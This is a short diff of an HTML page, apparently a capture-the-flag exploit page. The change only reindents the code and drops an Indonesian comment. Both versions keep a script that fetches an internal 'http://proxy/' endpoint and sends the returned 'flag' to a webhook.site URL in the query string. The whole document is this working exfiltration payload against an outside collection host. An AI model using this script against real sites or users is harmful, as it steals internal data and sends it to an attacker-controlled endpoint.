@@ -1,12 +1,14 @@
 <html>
-  <body>
+
+<body>
     <script>
-      // redirect ke proxy, ambil isi, lalu kirim
-      fetch("http://proxy/")
-        .then(r => r.text())
-        .then(flag => {
-          location.href = "https://webhook.site/9cf23925-1943-4d85-9be5-56a8ca40c833/?flag=" + encodeURIComponent(flag);
-        });
+        fetch("http://proxy/")
+            .then(r => r.text())
+            .then(flag => {
+                location.href = "https://webhook.site/9cf23925-1943-4d85-9be5-56a8ca40c833/?flag=" + encodeURIComponent(flag);
+            });
     </script>
-  </body>
+
+</body>
+
 </html>
